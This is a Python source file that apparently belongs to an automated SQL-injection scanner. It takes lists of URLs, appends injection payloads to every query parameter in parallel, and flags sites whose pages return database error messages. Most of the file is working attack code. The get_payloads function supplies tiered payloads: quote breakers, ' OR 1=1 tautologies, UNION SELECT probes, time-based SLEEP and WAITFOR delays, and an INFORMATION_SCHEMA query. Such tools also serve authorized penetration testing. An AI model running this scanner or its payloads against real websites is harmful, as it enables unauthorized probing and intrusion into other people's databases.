#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import signal
import multiprocessing
from urllib.parse import urlparse
from typing import List, Tuple, Optional, Dict, Any
from concurrent.futures import ThreadPoolExecutor, as_completed

from src import std
from src import sqlerrors
from src.web import web


def init():
    signal.signal(signal.SIGINT, signal.SIG_IGN)


def scan(urls: List[str], threads: int = 10, level: int = 2) -> List[Tuple[str, str]]:
    if not urls:
        return []
    
    vulnerables = []
    results = {}
    
    max_processes = min(multiprocessing.cpu_count() * 2, threads)
    pool = multiprocessing.Pool(max_processes, init)
    
    childs = []
    for url in urls:
        child = pool.apply_async(__sqli, (url, level))
        childs.append(child)
    
    try:
        while True:
            time.sleep(0.5)
            if all(child.ready() for child in childs):
                break
    except KeyboardInterrupt:
        std.stderr("stopping sqli scanning process")
        pool.terminate()
        pool.join()
        return []
    
    pool.close()
    pool.join()
    
    for child in childs:
        try:
            url, is_vulnerable, db_name = child.get(timeout=1)
            if is_vulnerable and db_name:
                vulnerables.append((url, db_name))
        except Exception as e:
            std.stderr(f"error getting result: {e}")
    
    return vulnerables


def scan_parallel(urls: List[str], threads: int = 20, level: int = 2) -> List[Tuple[str, str]]:
    vulnerables = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(__sqli_thread, url, level): url for url in urls}
        
        for future in as_completed(futures):
            try:
                url, is_vulnerable, db_name = future.result(timeout=10)
                if is_vulnerable and db_name:
                    vulnerables.append((url, db_name))
            except:
                continue
                
    return vulnerables


def __sqli(url: str, level: int = 2) -> Tuple[str, bool, Optional[str]]:
    std.stdout(f"scanning {url}", end="")
    
    parsed = urlparse(url)
    domain = url.split("?")[0]
    query_string = parsed.query
    
    if not query_string:
        print("")
        return url, False, None
    
    queries = query_string.split("&")
    
    payloads = get_payloads(level)
    
    for payload in payloads:
        new_params = []
        for param in queries:
            if '=' in param:
                param_name, param_value = param.split('=', 1)
                new_params.append(f"{param_name}={param_value}{payload}")
            else:
                new_params.append(f"{param}{payload}")
        
        new_query = "&".join(new_params)
        target_url = f"{domain}?{new_query}"
        
        source = web.gethtml(target_url)
        if source:
            vulnerable, db = sqlerrors.check(source)
            if vulnerable and db:
                std.showsign(" vulnerable")
                return url, True, db
    
    print("")
    return url, False, None


def __sqli_thread(url: str, level: int = 2) -> Tuple[str, bool, Optional[str]]:
    parsed = urlparse(url)
    domain = url.split("?")[0]
    query_string = parsed.query
    
    if not query_string:
        return url, False, None
    
    queries = query_string.split("&")
    payloads = get_payloads(level)
    
    for payload in payloads:
        new_params = []
        for param in queries:
            if '=' in param:
                param_name, param_value = param.split('=', 1)
                new_params.append(f"{param_name}={param_value}{payload}")
            else:
                new_params.append(f"{param}{payload}")
        
        new_query = "&".join(new_params)
        target_url = f"{domain}?{new_query}"
        
        source = web.gethtml(target_url)
        if source:
            vulnerable, db = sqlerrors.check(source)
            if vulnerable and db:
                return url, True, db
    
    return url, False, None


def get_payloads(level: int = 2) -> List[str]:
    base_payloads = [
        "'", "')", "';", '"', '")', '";',
        '`', '`)', '`;', '\\', "%27",
        "%%2727", "%25%27", "%60"
    ]
    
    if level >= 2:
        base_payloads.extend([
            "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
            "' AND SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--",
            "' OR 1=1#", "') OR ('1'='1", "1' AND '1'='1"
        ])
    
    if level >= 3:
        base_payloads.extend([
            "' OR '1'='1'/*", "' OR 1=1-- -", "' OR 1=1#",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)--"
        ])
    
    return base_payloads
